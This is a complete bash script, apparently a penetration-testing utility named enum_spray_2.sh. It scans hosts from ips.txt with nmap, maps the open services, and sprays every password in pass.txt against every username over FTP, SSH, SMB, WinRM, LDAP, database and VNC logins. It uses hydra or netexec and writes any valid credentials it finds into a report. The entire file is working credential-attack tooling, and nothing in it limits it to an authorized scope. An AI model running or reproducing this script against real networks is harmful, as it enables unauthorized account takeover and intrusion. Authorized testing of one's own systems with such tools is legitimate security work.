#!/usr/bin/env bash
#==============================================================================
#  enum_spray_2.sh  -  single-file enumeration + credential spray
#
#  Drop this script on the Desktop next to ips.txt / users.txt / pass.txt and:
#
#      ./enum_spray_2.sh
#
#  It reads the input files from its OWN directory (no -d needed), scans the
#  hosts, sprays every password against every user, and writes a report.
#
#  Requires : nmap, hydra
#  Optional : netexec / nxc  (only used if --sprayer nxc or auto finds it)
#
#  Every service ends with a clear verdict:
#     HIT          - at least one login worked (printed + saved)
#     CLEAN        - the sprayer really ran every round, nothing worked
#     INCONCLUSIVE - the sprayer did not run / errored; NOT proof of bad creds
#
#  Usage:
#     ./enum_spray_2.sh                  # inputs from script dir
#     ./enum_spray_2.sh --dry-run        # show the plan only
#     ./enum_spray_2.sh --no-scan        # reuse nmap xml from last run
#     ./enum_spray_2.sh --services ftp   # restrict protocols
#==============================================================================
set -uo pipefail

VERSION="2.0"

SELF_DIR=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" 2>/dev/null && pwd) || SELF_DIR=$PWD
PROG=$(basename -- "${BASH_SOURCE[0]:-$0}")
TAB=$(printf '\t')

#-------------------------------- output helpers ------------------------------
C_R=$'\033[0m'; C_RED=$'\033[31m'; C_GRN=$'\033[32m'
C_YEL=$'\033[33m'; C_CYN=$'\033[36m'; C_BLD=$'\033[1m'
msg()  { printf '%s[*]%s %s\n' "$C_CYN" "$C_R" "$*"; }
sub()  { printf '      %s\n' "$*"; }
ok()   { printf '%s[+]%s %s\n' "$C_GRN" "$C_R" "$*"; }
warn() { printf '%s[!]%s %s\n' "$C_YEL" "$C_R" "$*" >&2; }
bad()  { printf '%s[-]%s %s\n' "$C_RED" "$C_R" "$*" >&2; }
hr()   { printf '  %s\n' "--------------------------------------------------------------------"; }
die()  { bad "$*"; exit 1; }

#-------------------------------- defaults ------------------------------------
INPUT_DIR=""
IPS_FILE=""
USERS_FILE=""
PASS_FILE=""
OUT=""
DO_SCAN=1
DRY=0
FORCE_SPRAYER="auto"      # auto | hydra | nxc
ONLY_SERVICES=""          # override of the sprayable protocol list
THREADS=4
TIMEOUT=10
PORTS="21,22,23,25,110,139,143,389,445,465,587,993,995,1433,3306,3389,5432,5900,5985,5986,20000,8080,8443"

DEFAULT_SERVICES="ftp,ssh,mysql,mssql,postgres,smtp,telnet,vnc,ldap,smb,winrm"

NMAP=""
HYDRA=""
NXC=""

usage() {
  cat <<EOF
$PROG v$VERSION - enumerate and spray credentials

  ./$PROG                       inputs from the script's own directory
  ./$PROG -d DIR                inputs from DIR instead
  ./$PROG --dry-run             print the plan, send nothing
  ./$PROG --no-scan             reuse nmap XML from the output dir
  ./$PROG --services ftp,ssh    only spray these protocols
  ./$PROG --sprayer hydra|nxc   force a sprayer
  ./$PROG --ports 21,22,20000   override the scanned port list
  ./$PROG -o DIR                output directory

Inputs (all optional, but you need at least ips.txt):
  ips.txt    one IP / hostname / CIDR per line
  users.txt  one username per line
  pass.txt   one password per line
EOF
}

#-------------------------------- arg parsing --------------------------------
while [[ $# -gt 0 ]]; do
  case "$1" in
    -d|--dir)        INPUT_DIR="${2:-}"; shift 2;;
    --ips)           IPS_FILE="${2:-}";   shift 2;;
    --users)         USERS_FILE="${2:-}"; shift 2;;
    --pass|--passwords) PASS_FILE="${2:-}"; shift 2;;
    -o|--out)        OUT="${2:-}";        shift 2;;
    --ports)         PORTS="${2:-}";      shift 2;;
    --services)      ONLY_SERVICES="${2:-}"; shift 2;;
    --sprayer)       FORCE_SPRAYER="${2:-}"; shift 2;;
    --threads)       THREADS="${2:-4}";   shift 2;;
    --timeout)       TIMEOUT="${2:-10}";  shift 2;;
    --no-scan)       DO_SCAN=0;   shift;;
    --dry-run)       DRY=1;       shift;;
    -h|--help)       usage; exit 0;;
    --version)       echo "$PROG $VERSION"; exit 0;;
    *)               die "unknown option: $1 (try --help)";;
  esac
done

[[ $THREADS =~ ^[0-9]+$ ]] || die "--threads must be a number"
[[ $TIMEOUT =~ ^[0-9]+$ ]] || die "--timeout must be a number"
case "$FORCE_SPRAYER" in auto|hydra|nxc) ;; *) die "--sprayer must be auto, hydra or nxc";; esac

SERVICES="${ONLY_SERVICES:-$DEFAULT_SERVICES}"

#-------------------------------- preflight ----------------------------------
command -v nmap  >/dev/null 2>&1 && NMAP=$(command -v nmap)
command -v hydra >/dev/null 2>&1 && HYDRA=$(command -v hydra)
for c in nxc netexec crackmapexec; do
  if command -v "$c" >/dev/null 2>&1; then NXC=$(command -v "$c"); break; fi
done

preflight() {
  (( DO_SCAN == 0 )) || [[ -n $NMAP ]] || die "nmap not found and --no-scan not given"
  case "$FORCE_SPRAYER" in
    hydra) [[ -n $HYDRA ]] || die "--sprayer hydra given but hydra not found";;
    nxc)   [[ -n $NXC   ]] || die "--sprayer nxc given but no nxc/netexec/crackmapexec found";;
    auto)  [[ -n $HYDRA || -n $NXC ]] || die "no sprayer found (need hydra or netexec)";;
  esac
  [[ -z $HYDRA ]] || msg "sprayer : hydra ($HYDRA)"
  [[ -z $NXC   ]] || msg "sprayer : $NXC (fallback only, --sprayer nxc to force)"
}

#-------------------------------- input layout -------------------------------
resolve_inputs() {
  # an explicit -d wins; otherwise prefer the script's own directory (Desktop),
  # then the current directory, then ~/Desktop / /root/Desktop
  if [[ -n $INPUT_DIR ]]; then
    [[ -d $INPUT_DIR ]] || die "input directory not found: $INPUT_DIR"
  else
    local cand
    for cand in "$SELF_DIR" "$PWD" "$HOME/Desktop" "/root/Desktop"; do
      [[ -d $cand ]] || continue
      if [[ -f $cand/ips.txt || -f $cand/users.txt || -f $cand/pass.txt ]]; then
        INPUT_DIR=$cand; break
      fi
    done
    INPUT_DIR="${INPUT_DIR:-$SELF_DIR}"
  fi

  IPS_FILE="${IPS_FILE:-$INPUT_DIR/ips.txt}"
  USERS_FILE="${USERS_FILE:-$INPUT_DIR/users.txt}"
  PASS_FILE="${PASS_FILE:-$INPUT_DIR/pass.txt}"

  if [[ -z $OUT ]]; then OUT="$INPUT_DIR/enum_spray_2_$(date +%Y%m%d_%H%M%S)"; fi
  PREV_RUN=""
  if (( DO_SCAN == 0 )); then
    PREV_RUN=$(ls -1d "$INPUT_DIR"/enum_spray_2_* 2>/dev/null | sort | tail -n1)
  fi
}

make_dirs() {
  mkdir -p "$OUT"/{nmap,norm,logs,results} || die "cannot create $OUT"
  if (( DO_SCAN == 0 )) && [[ -n ${PREV_RUN:-} && -d $PREV_RUN/nmap ]]; then
    cp -f "$PREV_RUN"/nmap/*.xml "$OUT/nmap/" 2>/dev/null \
      && msg "--no-scan: reusing XML from $PREV_RUN"
  fi
  SERVICES_TSV="$OUT/results/services.tsv";  : > "$SERVICES_TSV"
  PLAN="$OUT/results/plan.tsv";              : > "$PLAN"
  HITS="$OUT/results/hits.tsv";              : > "$HITS"
  ERRORS="$OUT/results/sprayer_errors.tsv";  : > "$ERRORS"
  VERDICTS="$OUT/results/verdicts.tsv";      : > "$VERDICTS"
  REPORT="$OUT/report.md"
}

normalize() { # src dst [strip-comments]
  local src=$1 dst=$2
  if [[ ! -f $src ]]; then : > "$dst"; return 1; fi
  tr -d '\r' < "$src" \
    | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//' \
    | grep -vE '^($|#|;)' | awk '!seen[$0]++' > "$dst"
  [[ -s $dst ]]
}

normalize_inputs() {
  IPS_NORM="$OUT/norm/ips.txt"
  USERS_NORM="$OUT/norm/users.txt"
  PASS_NORM="$OUT/norm/pass.txt"

  if normalize "$IPS_FILE" "$IPS_NORM"; then
    sub "ips.txt   : $(wc -l < "$IPS_NORM") target(s)   [$IPS_FILE]"
  else
    warn "no usable targets in $IPS_FILE"
  fi

  if normalize "$USERS_FILE" "$USERS_NORM"; then
    sub "users.txt : $(wc -l < "$USERS_NORM") username(s) [$USERS_FILE]"
  else
    warn "no usable usernames in $USERS_FILE - spray stage will be skipped"
  fi

  if normalize "$PASS_FILE" "$PASS_NORM"; then
    sub "pass.txt  : $(wc -l < "$PASS_NORM") password(s) [$PASS_FILE]"
  else
    warn "no usable passwords in $PASS_FILE - spray stage will be skipped"
  fi

  (( $(wc -l < "$USERS_NORM") > 0 && $(wc -l < "$PASS_NORM") > 0 )) || DO_SPRAY=0
}
DO_SPRAY=${DO_SPRAY:-1}

#-------------------------------- scan stage ---------------------------------
scan() {
  if (( DO_SCAN == 0 )); then
    msg "scan skipped (--no-scan) - reading $OUT/nmap/*.xml"
    local xml
    for xml in "$OUT"/nmap/*.xml; do
      [[ -f $xml ]] || continue
      parse_xml "$xml" >> "$SERVICES_TSV" || warn "cannot parse $xml"
    done
    sort -u -t"$TAB" -k1,1V -k2,2n "$SERVICES_TSV" -o "$SERVICES_TSV"
    msg "open ports recovered: $(wc -l < "$SERVICES_TSV")"
    (( $(wc -l < "$SERVICES_TSV") > 0 )) || warn "no nmap XML found in $OUT/nmap - run without --no-scan first"
    return 0
  fi

  [[ -n $NMAP ]] || { warn "nmap not available - scan skipped"; return 0; }
  hr
  msg "nmap: -p$PORTS -T4 (targets: $(wc -l < "$IPS_NORM"))"
  if (( DRY == 1 )); then
    sub "[dry-run] nmap -Pn -sV -p$PORTS -T4 --open -oA $OUT/nmap/scan -iL $IPS_NORM"
    return 0
  fi
  "$NMAP" -Pn -sV -p"$PORTS" -T4 --open -oA "$OUT/nmap/scan" \
      -iL "$IPS_NORM" > "$OUT/nmap/scan.stdout" 2>&1
  local rc=$?
  (( rc == 0 )) || warn "nmap exited $rc (see $OUT/nmap/scan.stdout)"

  if [[ -f $OUT/nmap/scan.xml ]]; then
    parse_xml "$OUT/nmap/scan.xml" > "$SERVICES_TSV" || warn "cannot parse nmap XML"
    ok "open ports: $(wc -l < "$SERVICES_TSV")"
  else
    warn "nmap produced no XML"
  fi
}

parse_xml() { # nmap xml -> TSV: host port proto service product version
  python3 - "$1" <<'PY'
import sys, xml.etree.ElementTree as ET
try:
    root = ET.parse(sys.argv[1]).getroot()
except Exception as exc:
    sys.stderr.write("parse error: %s\n" % exc)
    sys.exit(1)
for host in root.findall('host'):
    st = host.find('status')
    if st is not None and st.get('state') != 'up':
        continue
    addr = ''
    for a in host.findall('address'):
        if a.get('addrtype') in ('ipv4', 'ipv6'):
            addr = a.get('addr') or ''
            break
    if not addr:
        continue
    for p in host.findall('ports/port'):
        s = p.find('state')
        if s is None or s.get('state') != 'open':
            continue
        svc = p.find('service')
        name = (svc.get('name') if svc is not None else '') or '-'
        prod = (svc.get('product') if svc is not None else '') or '-'
        ver = (svc.get('version') if svc is not None else '') or '-'
        print('\t'.join([addr, p.get('portid', ''), p.get('protocol', ''),
                         name, prod, ver]))
PY
}

#-------------------------------- plan stage ---------------------------------
svc_to_proto() { # nmap service name, port -> protocol (empty = not sprayable)
  local n=${1,,} p=${2:-0}
  case "$n" in
    ftp|ssh|telnet|smtp|mysql|vnc) echo "$n"; return;;
    postgresql|postgres) echo postgres; return;;
    ms-sql-s|mssql) echo mssql; return;;
    microsoft-ds|netbios-ssn|smb) echo smb; return;;
    ldap|ldaps|globalcatldap*) echo ldap; return;;
    wsman) echo winrm; return;;
  esac
  case "$p" in
    21) echo ftp;;              22) echo ssh;;
    23) echo telnet;;           25|587|465) echo smtp;;
    3306) echo mysql;;          5900|5901) echo vnc;;
    5432) echo postgres;;       1433) echo mssql;;
    445|139) echo smb;;         389|636|3268|3269) echo ldap;;
    5985|5986) echo winrm;;
  esac
}

service_wanted() { [[ ",${SERVICES}," == *",$1,"* ]]; }

build_plan() {
  local addr port proto sname prod ver
  [[ -s $SERVICES_TSV ]] || return 0
  while IFS="$TAB" read -r addr port proto sname prod ver; do
    [[ -z ${addr:-}${port:-} ]] && continue
    local p; p=$(svc_to_proto "${sname:-}" "$port")
    [[ -z $p ]] && continue
    service_wanted "$p" || continue
    printf '%s\t%s\t%s\n' "$addr" "$port" "$p" >> "$PLAN"
  done < "$SERVICES_TSV"
  # one entry per host+protocol (nmap can report the same thing twice)
  awk -F'\t' '!seen[$1 FS $3]++' "$PLAN" | sort -t"$TAB" -k1,1V -k3,3 -k2,2n > "$PLAN.tmp"
  mv "$PLAN.tmp" "$PLAN"
}

#-------------------------------- spray stage --------------------------------
hydra_svc() { case $1 in ldap) echo ldap2;; smb|winrm) echo "";; *) echo "$1";; esac; }

sprayer_for() { # proto -> hydra|nxc|none
  case "$FORCE_SPRAYER" in
    hydra) echo hydra; return;;
    nxc)   echo nxc;   return;;
  esac
  if [[ -n $HYDRA ]]; then echo hydra; return; fi
  if [[ -n $NXC   ]]; then echo nxc;   return; fi
  echo none
}

run_hydra() { # proto ip port password
  local proto=$1 ip=$2 port=$3 pw=$4 svc
  svc=$(hydra_svc "$proto")
  [[ -n $svc ]] || { echo "[!] hydra has no module for $proto"; return 2; }
  if [[ $proto == vnc ]]; then
    "$HYDRA" -I -P <(printf '%s\n' "$pw") -s "$port" -t 1 -w "$TIMEOUT" "$ip" vnc 2>&1
    return $?
  fi
  "$HYDRA" -I -L "$USERS_NORM" -p "$pw" -s "$port" -t "$THREADS" -w "$TIMEOUT" \
           "$ip" "$svc" 2>&1
  return $?
}

run_nxc() { # proto ip port password
  local proto=$1 ip=$2 port=$3 pw=$4
  local aux="$OUT/norm/.pw_one"
  printf '%s\n' "$pw" > "$aux"
  "$NXC" "$proto" "$ip" -u "$USERS_NORM" -p "$aux" --continue-on-success --port "$port" 2>&1
  local rc=$?
  rm -f "$aux"
  return $rc
}

spray_service() { # proto ip port
  local proto=$1 ip=$2 port=$3
  local log="$OUT/logs/${ip//[^A-Za-z0-9._-]/_}_${port}_${proto}.log"
  local tool; tool=$(sprayer_for "$proto")
  local rounds=0 evidence=0 errors=0 hits=0 rc pw
  : > "$log"

  msg "spray $proto $ip:$port  (tool: $tool)"

  if [[ $tool == none ]]; then
    printf '%s\t%s\t%s\t%s\t%s\n' "$proto" "$ip" "$port" "INCONCLUSIVE" "no sprayer available" >> "$VERDICTS"
    warn "  no sprayer available - $proto $ip:$port not tested"
    return 0
  fi

  if (( DRY == 1 )); then
    sub "[dry-run] $(wc -l < "$USERS_NORM") users x $(wc -l < "$PASS_NORM") passwords"
    return 0
  fi

  while IFS= read -r pw; do
    [[ -n $pw ]] || continue
    rounds=$((rounds + 1))
    printf '\n##### round %d/%d #####\n' "$rounds" "$(wc -l < "$PASS_NORM")" >> "$log"

    local out
    if [[ $tool == hydra ]]; then
      out=$(run_hydra "$proto" "$ip" "$port" "$pw"); rc=$?
    else
      out=$(run_nxc "$proto" "$ip" "$port" "$pw"); rc=$?
    fi
    printf '%s\n' "$out" >> "$log"

    # evidence that the sprayer really attempted logins this round
    if [[ $tool == hydra ]]; then
      grep -q 'login tries' <<<"$out" && evidence=$((evidence + 1))
    else
      grep -qE '\[[+-]\] ' <<<"$out" && evidence=$((evidence + 1))
    fi
    (( rc != 0 )) && { errors=$((errors + 1));
      printf '%s\t%s\t%s\trc=%s round=%s\n' "$proto" "$ip" "$port" "$rc" "$rounds" >> "$ERRORS"; }

    # collect successful logins
    while IFS= read -r line; do
      [[ -n $line ]] || continue
      printf '%s\t%s\t%s\t%s\n' "$proto" "$ip" "$port" "$line" >> "$HITS"
      ok "  HIT  $proto $ip:$port  $line"
      hits=$((hits + 1))
    done < <(grep -F 'login:' <<<"$out" | sed 's/^[[:space:]]*//')
  done < "$PASS_NORM"

  local verdict
  if   (( hits > 0 ));        then verdict="HIT"
  elif (( evidence == 0 ));   then verdict="INCONCLUSIVE"
  elif (( errors >= rounds )); then verdict="INCONCLUSIVE"
  elif (( errors > 0 ));      then verdict="PARTIAL"
  else                             verdict="CLEAN"
  fi
  printf '%s\t%s\t%s\t%s\t%s/%s rounds, %s hit(s), %s evidence round(s), %s error(s)\n' \
    "$proto" "$ip" "$port" "$verdict" "$rounds" "$rounds" "$hits" "$evidence" "$errors" >> "$VERDICTS"

  case "$verdict" in
    HIT)          ok "  $proto $ip:$port -> HIT ($hits credential pair(s))";;
    CLEAN)        sub "  $proto $ip:$port -> CLEAN (all $rounds round(s) really ran)";;
    PARTIAL)      warn "  $proto $ip:$port -> PARTIAL ($errors/$rounds round(s) errored, no hit) - see $log";;
    INCONCLUSIVE) warn "  $proto $ip:$port -> INCONCLUSIVE (see $log) - do NOT read this as 'no creds'";;
  esac
}

spray_all() {
  if (( DO_SPRAY == 0 )); then
    warn "spray skipped - users.txt or pass.txt is empty"
    return 0
  fi
  local count; count=$(wc -l < "$PLAN")
  if (( count == 0 )); then
    warn "nothing sprayable in the scan results"
    return 0
  fi
  hr
  msg "spray plan: $count service(s), $(wc -l < "$USERS_NORM") user(s) x $(wc -l < "$PASS_NORM") password(s)"
  local ip port proto
  while IFS="$TAB" read -r ip port proto; do
    [[ -n ${ip:-} ]] || continue
    spray_service "$proto" "$ip" "$port"
  done < "$PLAN"
}

#-------------------------------- report -------------------------------------
report() {
  local hits=0 svcs=0
  [[ -s $HITS ]] && hits=$(wc -l < "$HITS")
  [[ -s $SERVICES_TSV ]] && svcs=$(wc -l < "$SERVICES_TSV")

  {
    printf '# enum_spray_2 report - %s\n\n' "$(date '+%Y-%m-%d %H:%M:%S %Z')"
    printf '| item | value |\n|---|---|\n'
    printf '| input dir | `%s` |\n' "$INPUT_DIR"
    printf '| targets | %s |\n' "$(wc -l < "$IPS_NORM" 2>/dev/null || echo 0)"
    printf '| users | %s |\n' "$(wc -l < "$USERS_NORM" 2>/dev/null || echo 0)"
    printf '| passwords | %s |\n' "$(wc -l < "$PASS_NORM" 2>/dev/null || echo 0)"
    printf '| open ports | %s |\n' "$svcs"
    printf '| hits | %s |\n\n' "$hits"

    printf '## Open services\n\n'
    if (( svcs > 0 )); then
      printf '| host | port | service | product / version |\n|---|---|---|---|\n'
      while IFS="$TAB" read -r a p pr s prod ver; do
        [[ -n ${a:-} ]] || continue
        printf '| %s | %s/%s | %s | %s %s |\n' "$a" "$p" "$pr" "$s" "$prod" "$ver"
      done < "$SERVICES_TSV"
    else
      printf '_none recorded_\n'
    fi

    printf '\n## Verdicts\n\n'
    if [[ -s $VERDICTS ]]; then
      printf '| protocol | host | port | verdict | detail |\n|---|---|---|---|---|\n'
      while IFS="$TAB" read -r pr a p v d; do
        [[ -n ${pr:-} ]] || continue
        printf '| %s | %s | %s | **%s** | %s |\n' "$pr" "$a" "$p" "$v" "$d"
      done < "$VERDICTS"
    else
      printf '_nothing sprayed_\n'
    fi

    printf '\n## Valid credentials\n\n'
    if (( hits > 0 )); then
      printf '```\n'; cat "$HITS"; printf '```\n'
    else
      printf '_none_\n'
    fi

    if [[ -s $ERRORS ]]; then
      printf '\n## Sprayer errors\n\n```\n'; cat "$ERRORS"; printf '```\n'
    fi
  } > "$REPORT"

  printf 'protocol\thost\tport\tsuccess\n' > "$OUT/results/hits.csv"
  cat "$HITS" >> "$OUT/results/hits.csv" 2>/dev/null

  msg "report: $REPORT"
}

summary() {
  hr
  printf '%s RESULTS %s\n' "$C_BLD" "$C_R"
  sub "open ports : $(wc -l < "$SERVICES_TSV" 2>/dev/null || echo 0)"
  sub "sprayed    : $(wc -l < "$PLAN" 2>/dev/null || echo 0) service(s)"
  sub "hits       : $([[ -s $HITS ]] && wc -l < "$HITS" || echo 0)"
  if [[ -s $HITS ]]; then hr; sed 's/^/      /' "$HITS"; fi
  hr
  sub "output     : $OUT"
}

#-------------------------------- main ---------------------------------------
main() {
  printf '%s\n' "${C_BLD}${PROG} v${VERSION}${C_R}"
  preflight
  resolve_inputs
  make_dirs
  normalize_inputs
  msg "input folder: $INPUT_DIR"

  if [[ ! -s $IPS_NORM ]]; then
    warn "ips.txt has no usable target - nothing to do"
    report; summary; exit 1
  fi

  scan
  build_plan
  spray_all
  report
  summary
}
main "$@"
